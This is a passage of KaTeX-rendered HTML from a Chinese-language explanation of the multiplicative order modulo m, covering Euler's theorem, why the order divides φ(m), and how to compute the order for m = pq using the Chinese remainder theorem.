class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mi>x</mi></msup><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="0.4444em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333em"/><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">a^x \equiv 1 \pmod{m}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6644em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.4444em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.3333em;"></span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span> 成立的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span>，包括 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span></p><p>由于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo></mrow></msup><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="0.4444em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333em"/><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">a^{\phi(m)} \equiv 1 \pmod{m}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.888em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ϕ</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">m</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.4444em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.3333em;"></span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span> 总是成立的（根据欧拉定理），这意味着群的阶必须是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span> 的因子。因为，如果存在某个 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>&lt;</mo><mi>ϕ</mi><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">k &lt; \phi(m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7335em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span>，使得 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mi>k</mi></msup><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="0.4444em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333em"/><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">a^k \equiv 1 \pmod{m}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.4444em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.3333em;"></span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span>，那么 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span> 必须是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 的倍数，以保证群的循环性和阶的定义。</p><p>简而言之，幂的循环至多在达到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span> 时完成一次循环，而实际的循环可能在更早的点完成，因此实际的循环长度（群的阶）是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span> 的因子。</p><p><strong>计算阶的办法</strong> 除了直接从 1 开始遍历，找到最小正整数使得 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><msup><mn>0</mn><mi>k</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>m</mi><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">10^k \mod m=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>，还可以进行简化，尤其是 k 非常大的情况。<br>当<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>=</mo><mi>p</mi><mi>q</mi></mrow><annotation encoding="application/x-tex">m = pq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">pq</span></span></span></span>，其中<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>是不同的质数，并且<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span>与<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>都互质。</p><p>假设<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mi>k</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">a^k \mod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span></span></span></span>的乘法群阶为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">n_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mi>k</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>q</mi></mrow><annotation encoding="application/x-tex">a^k \mod q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>的乘法群阶为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">n_q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>。根据欧拉定理，我们知道<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow></msup><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">a^{\phi(p)} \equiv 1 \mod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.888em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ϕ</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">p</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>q</mi><mo stretchy="false">)</mo></mrow></msup><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>q</mi></mrow><annotation encoding="application/x-tex">a^{\phi(q)} \equiv 1 \mod q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.888em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ϕ</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>，因此<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mi>p</mi></msub><mi mathvariant="normal">∣</mi><mi>ϕ</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">n_p | \phi(p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span>且<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mi>q</mi></msub><mi mathvariant="normal">∣</mi><mi>ϕ</mi><mo stretchy="false">(</mo><mi>q</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">n_q | \phi(q)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span></span>。</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mi>k</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>m</mi></mrow><annotation encoding="application/x-tex">a^k \mod m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span></span></span></span>的乘法群阶，设为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mi>m</mi></msub></mrow><annotation encoding="application/x-tex">n_m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，是最小的正整数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>，使得<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mi>n</mi></msup><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>m</mi></mrow><annotation encoding="application/x-tex">a^n \equiv 1 \mod m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6644em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span></span></span></span>。由于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>=</mo><mi>p</mi><mi>q</mi></mrow><annotation encoding="application/x-tex">m = pq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">pq</span></span></span></span>，根据中国剩余定理，如果我们可以同时满足<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mi>n</mi></msup><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">a^n \equiv 1 \mod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6644em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mi>n</mi></msup><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>q</mi></mrow><annotation encoding="application/x-tex">a^n \equiv 1 \mod q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6644em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span 